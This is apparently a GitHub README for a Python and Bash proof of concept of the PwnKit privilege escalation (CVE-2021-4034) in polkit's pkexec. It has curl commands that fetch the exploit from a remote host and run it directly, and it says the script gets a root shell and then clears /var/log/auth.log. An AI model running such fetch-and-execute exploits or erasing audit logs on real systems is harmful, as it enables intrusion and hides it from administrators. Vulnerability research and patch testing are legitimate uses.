```
██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
A Python3 and a BASH PoC for CVE-2021-4034 by Kim Schulz
``` 

# Intro

This is a simple PoC for the newly found Polkit error names [PwnKit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034).

I made it both as bash and python3 script - just for the fun of it. 

The issue is very simple to abuse but has huge consequences as it will easily give root access on most Linux machines where the attacker has local user access. 

# How to run
This scripts are a one shot execution so simply do
```
python3 pkwner.py
```
or
```
bash pkwner.sh
```
You can also run it directly from a webserver (e.g. this github repo) via:
```
python3 <(curl https://raw.githubusercontent.com/kimusan/pkwner/main/pkwner.py)
```
or
```
source <(curl -s https://raw.githubusercontent.com/kimusan/pkwner/main/pkwner.sh))
```

In both cases it should look something like this:
![alt text](https://github.com/kimusan/pkwner/raw/main/screenshot-py.gif "screenshot")
and 
![alt text](https://github.com/kimusan/pkwner/raw/main/screenshot-sh.gif "screenshot")


The script will create some files and folders but will cleanup after itself when the root shell is popped - it will even clean up the /var/log/auth.log (because why not). 

# Credits

- **Qualys** for finding the issue and making the info public
- **Andris Raugulis** for making one of the first PoCs to get inspired from
- **MiscGang** because misgang@[Kalmarunionen](https://kalmarunionen.dk) are baddass 
